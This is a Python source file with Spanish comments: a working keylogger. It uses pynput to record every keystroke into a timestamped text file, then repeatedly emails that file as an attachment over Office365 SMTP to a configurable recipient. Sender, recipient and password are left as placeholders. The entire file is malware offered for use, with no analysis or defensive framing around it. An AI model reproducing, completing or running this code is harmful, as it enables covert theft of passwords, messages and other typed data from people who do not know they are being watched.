from pynput.keyboard import Listener 
import time,datetime,smtplib
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

def teclado_():
  
    fecha= datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    nombre_archivo = 'Cadena_{}.txt'.format(fecha)  # se crea un archivo txt con la fecha actual
    t0=time.time()
    
    def grabadora(tecla):
       
        archivo = open(nombre_archivo, "a") # se abre el arcihvo creado
        tecla=str(tecla)
        print(tecla)
        if tecla == 'Key.enter':
            archivo.write('\n')
        elif tecla =='Key.space':
            archivo.write(' ')
        elif tecla=='Key.backspace':
            archivo.write('<--')
        elif tecla=='Key.alt_l<102><100>':  #intento de generar la arroba con alt
            archivo.write('@')
        elif tecla=='Key.shift_r':
            archivo.write('')
        elif tecla=='Key.caps_lock':
            archivo.write('')
        elif tecla=='Key.shift':
            archivo.write('')
        elif tecla=='Key.alt_l':
            archivo.write('ALT + ')
        elif tecla=='Key.num_lock':
            archivo.write('')
        elif tecla=='<97>':
            archivo.write('1')
        elif tecla=='<98>':
            archivo.write('2')
        elif tecla=='<99>':
            archivo.write('3')
        elif tecla=='<100>':
            archivo.write('4')
        elif tecla=='<101>':
            archivo.write('5')
        elif tecla=='<102>':
            archivo.write('6')
        elif tecla=='<103>':
            archivo.write('7')
        elif tecla=='<104>':
            archivo.write('8')
        elif tecla=='<105>':
            archivo.write('9')
        else:
            archivo.write(tecla.replace("'", ""))

        if time.time()-t0 >45 :
            print('Tiempo en transcurrido : {}'.format(time.time()-t0))      
            archivo.close()
            enviar_email(nombre_archivo)
            teclado_()

    with Listener(on_press=grabadora) as l:
        l.join()

def enviar_email(archivo):

    passw = 'AQUI TU CONTRASEÑA DE EMAIL'

    msg=MIMEMultipart()
    msg['From']='AQUI EMAIL REMITENTE'
    msg['To']='AQUI EMAIL RECEPTOR'
    msg['Subject']='Tu archivo aqui: '
    mensaje='Aqui reportes'
    msg.attach(MIMEText(mensaje,'plain'))
    attachment=open(archivo,'r')

    p=MIMEBase('application','octet-stream') #informa que es una archivo que debe abrirse con una aplicacion
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition',"attachment; filename= %s" % str(archivo))
    msg.attach(p)

    server= smtplib.SMTP('smtp.office365.com:587')
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(msg['From'],passw)
    server.sendmail(msg['From'],msg['To'],msg.as_string())
    print("MENSAJE ENVIADO!!!")
    server.quit()


if __name__ =='__main__':
    
    teclado_()